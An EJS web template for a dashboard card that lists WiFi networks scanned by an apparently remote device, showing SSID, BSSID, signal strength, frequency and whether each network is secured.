<div class="card">
    <div class="card-header">
        <h2>WiFi Networks</h2>
        <button class="btn primary" onclick="sendCmd('0xWI', {})">🔍 Scan</button>
    </div>
    <p class="hint">Note: WiFi scanning requires Location services to be enabled on the device.</p>
    <% if (!data.list || data.list.length === 0) { %>
    <% if (data.error) { %>
    <div class="error-message" style="padding: 1rem; background: var(--error-bg); border-radius: 8px; margin-top: 1rem;">
        <strong>Error:</strong> <%= data.error %>
    </div>
    <% } else { %>
    <p class="empty">No networks found. Click Scan to search for WiFi networks.</p>
    <% } %>
    <% } else { %>
    <p class="hint"><%= data.list.length %> network<%= data.list.length !== 1 ? 's' : '' %> found</p>
    <div class="table-wrap">
        <table>
            <thead><tr><th>SSID</th><th>BSSID</th><th>Signal</th><th>Frequency</th><th>Security</th></tr></thead>
            <tbody>
                <% data.list.forEach(w => { %>
                <tr>
                    <td><strong><%= w.SSID || '(Hidden Network)' %></strong></td>
                    <td><code><%= w.BSSID || 'N/A' %></code></td>
                    <td>
                        <div class="signal-bar"><div class="signal-level" style="width: <%= Math.min(100, Math.max(0, (w.level + 100) * 2)) %>%"></div></div>
                        <span><%= w.level %> dBm</span>
                    </td>
                    <td><%= w.frequency %> MHz</td>
                    <td>
                        <% if (w.secure) { %>
                        <span class="badge" style="background: var(--success);">Secured</span>
                        <% } else { %>
                        <span class="badge" style="background: var(--warning);">Open</span>
                        <% } %>
                    </td>
                </tr>
                <% }) %>
            </tbody>
        </table>
    </div>
    <% } %>
</div>
